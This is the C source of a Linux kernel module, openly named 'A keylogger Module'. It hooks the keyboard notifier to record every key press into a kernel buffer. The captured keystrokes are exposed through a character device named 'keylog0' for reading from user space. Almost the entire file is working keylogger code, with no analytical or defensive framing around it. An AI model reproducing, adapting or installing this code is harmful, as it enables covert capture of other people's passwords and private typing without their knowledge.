#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/fs.h>
#include <linux/uaccess.h>


#include "keys.h"

// Module Info
#define DEVICE_NAME "keylog0"  // The Device name for our Device Driver
static int major;  // The Major Number that will be assigned to our Device Driver

// Keylogger Info
#define BUFFER_LEN 1024
static char keys_buffer[BUFFER_LEN];  // This buffer will contain all the logged keys
static char *keys_bf_ptr = keys_buffer; 
// Our buffer will only be of size 1024. If the user typed more that 1024 valid characters, the keys_buf_ptr would overflow
int buf_pos = 0;  // buf_pos keeps track of the count of characters read to avoid overflows in kernel space


int notifier(struct notifier_block *nb, unsigned long action, void *data){
    struct keyboard_notifier_param *param = (struct keyboard_notifier_param *)data;
    if(action == KBD_KEYSYM){
        if(param->down){
            if(buf_pos < BUFFER_LEN){
                //*(keys_bf_ptr++) = keycode[param->value][param->shift];
                //*(keys_bf_ptr++) = 35;
                *(keys_bf_ptr++) = param->value;
                //*(keys_bf_ptr++) = "A";
                //printk(KERN_INFO "Keylogger: %d",param->value);
                
                buf_pos++;
            }
            if(buf_pos >= BUFFER_LEN){
                buf_pos = 0;
                memset(keys_buffer, 0, BUFFER_LEN);
                keys_bf_ptr = keys_buffer;
            }
        }
    }
    return NOTIFY_OK;
}

static struct notifier_block keylogger_nb ={.notifier_call = notifier};


static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_t *offset){
    int bytes_read = 0;
    if(*offset == 0){
        bytes_read = strlen(keys_buffer);
        if(copy_to_user(buffer, keys_buffer, bytes_read)){
            return -EFAULT;
        }
        memset(keys_buffer, 0, BUFFER_LEN);
        keys_bf_ptr = keys_buffer;
        *offset += bytes_read;
        return bytes_read;
    }
    else{
        return 0;
    }
}


static struct file_operations fops = {
    .owner = THIS_MODULE,
    .read = device_read
};

static int keylogger_init(void){
    
    major = register_chrdev(0, DEVICE_NAME, &fops);
	if (major < 0) {
		printk(KERN_ALERT "keylog failed to register a major number\n");
		return major;
	}
	
	printk(KERN_INFO "Registered keylogger with major number %d", major);	
	
    int ret = register_keyboard_notifier(&keylogger_nb);
    if(ret == -1){
        printk(KERN_ALERT "Keylogger: unable to register keyboard notifier!");
        return ret;
    }

    memset(keys_buffer, 0, BUFFER_LEN);

    printk(KERN_INFO "Registered keylogger");
    return 0;
}

static void keylogger_exit(void){
    unregister_chrdev(major, DEVICE_NAME);
    unregister_keyboard_notifier(&keylogger_nb);
    printk(KERN_INFO "Unregistered keylogger");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Idan");
MODULE_DESCRIPTION("A keylogger Module");